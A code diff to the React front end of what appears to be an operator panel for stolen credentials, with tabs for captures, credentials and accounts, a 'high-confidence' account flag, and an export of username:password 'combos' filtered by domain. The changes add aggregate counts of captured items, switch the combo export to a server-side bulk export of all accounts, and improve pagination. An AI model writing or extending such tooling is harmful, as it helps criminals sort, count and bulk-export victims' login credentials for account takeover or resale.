@@ -33,6 +33,13 @@ function App() {
     }
   }, [])
 
+  // Fetch all-counts stats as soon as we are authenticated
+  useEffect(() => {
+    if (isAuthenticated && token) {
+      fetchStats(token)
+    }
+  }, [isAuthenticated, token])
+
   // Debounce search term
   useEffect(() => {
     const timer = setTimeout(() => {
@@ -58,6 +65,24 @@ function App() {
       fetchDomains()
     }
   }, [isAuthenticated, activeTab])
+
+  const fetchStats = async (authToken) => {
+    try {
+      const res = await fetch(`${API_BASE}/stats`, {
+        headers: { 'Authorization': `Bearer ${authToken || token}` }
+      })
+      if (res.ok) {
+        const json = await res.json()
+        setStats({
+          total_captures: json.total_captures || 0,
+          total_credentials: json.total_credentials || 0,
+          total_accounts: json.total_accounts || 0,
+        })
+      }
+    } catch (err) {
+      console.error('Stats fetch failed:', err)
+    }
+  }
 
   const fetchData = async () => {
     setLoading(true)
@@ -108,6 +133,8 @@ function App() {
         setStats(prev => ({ ...prev, total_accounts: json.total || 0 }))
       }
       setSelectedIds([]) // Reset selection on new data
+      // Keep sidebar stats fresh after each data load
+      fetchStats()
     } catch (err) {
       console.error('Fetch error:', err)
       setError(err.message)
@@ -215,19 +242,9 @@ function App() {
     }
   }
 
-  const handleExportAccounts = () => {
-    if (accounts.length === 0) return
-    const comboList = accounts.map(acc => `${acc.user}:${acc.password}`).join('\n')
-    const blob = new Blob([comboList], { type: 'text/plain' })
-    const url = URL.createObjectURL(blob)
-    const a = document.createElement('a')
-    a.href = url
-    const domainSuffix = domainFilter !== 'ALL' ? `_${domainFilter.replace(/[^a-z0-9]/gi, '_')}` : ''
-    a.download = `combos${domainSuffix}_${new Date().toISOString().split('T')[0]}.txt`
-    document.body.appendChild(a)
-    a.click()
-    document.body.removeChild(a)
-    URL.revokeObjectURL(url)
+  // Export all accounts server-side (not just the current page)
+  const handleExportAccounts = async () => {
+    await handleExportByDomain(domainFilter)
   }
 
   const handleExportByDomain = async (domain) => {
@@ -268,6 +285,13 @@ function App() {
 
   const handlePrevPage = () => { if (currentPage > 1) setCurrentPage(currentPage - 1) }
   const handleNextPage = () => { if (currentPage < totalPages) setCurrentPage(currentPage + 1) }
+  const handleJumpPage = (e) => {
+    if (e.key === 'Enter') {
+      const v = parseInt(e.target.value, 10)
+      if (!isNaN(v) && v >= 1 && v <= totalPages) setCurrentPage(v)
+      e.target.value = ''
+    }
+  }
 
   if (!isAuthenticated) {
     return <Login onLogin={handleLogin} />
@@ -394,6 +418,9 @@ function App() {
         ) : (
           <div className="data-view animate-fade">
             {activeTab === 'captures' ? (
+              captures.length === 0 ? (
+                <div className="empty-state">No captures found for the current filters.</div>
+              ) : (
               <table className="admin-table">
                 <thead>
                   <tr>
@@ -437,7 +464,11 @@ function App() {
                   ))}
                 </tbody>
               </table>
+              )
             ) : activeTab === 'credentials' ? (
+              credentials.length === 0 ? (
+                <div className="empty-state">No credentials found for the current filters.</div>
+              ) : (
               <div className="creds-grid">
                 {credentials.map(cr => (
                   <div key={cr.id} className="cred-card glass">
@@ -457,7 +488,11 @@ function App() {
                   </div>
                 ))}
               </div>
+              )
             ) : (
+              accounts.length === 0 ? (
+                <div className="empty-state">No accounts found for the current filters.</div>
+              ) : (
               <div className="accounts-grid">
                 {accounts.map(acc => (
                   <div key={acc.capture_id} className={`account-card glass animate-fade ${acc.is_high_confidence ? 'high-confidence' : ''}`}>
@@ -498,17 +533,28 @@ function App() {
                   </div>
                 ))}
               </div>
+              )
             )}
             <div className="pagination glass">
-              <button onClick={handlePrevPage} disabled={currentPage === 1}>Previous</button>
+              <button onClick={handlePrevPage} disabled={currentPage === 1}>&#8249; Prev</button>
               <span className="page-info">
-                Page {currentPage} of {totalPages} ({currentTotal} total {activeTab})
+                Page {currentPage} of {totalPages} &nbsp;({currentTotal.toLocaleString()} total)
               </span>
-              <button onClick={handleNextPage} disabled={currentPage === totalPages}>Next</button>
+              <input
+                className="page-jump"
+                type="number"
+                min={1}
+                max={totalPages}
+                placeholder="Go to"
+                onKeyDown={handleJumpPage}
+                title="Type a page number and press Enter"
+              />
+              <button onClick={handleNextPage} disabled={currentPage === totalPages}>Next &#8250;</button>
               <select value={pageSize} onChange={(e) => { setPageSize(Number(e.target.value)); setCurrentPage(1); }}>
                 <option value={20}>20 / page</option>
                 <option value={50}>50 / page</option>
                 <option value={100}>100 / page</option>
+                <option value={200}>200 / page</option>
               </select>
             </div>
           </div>
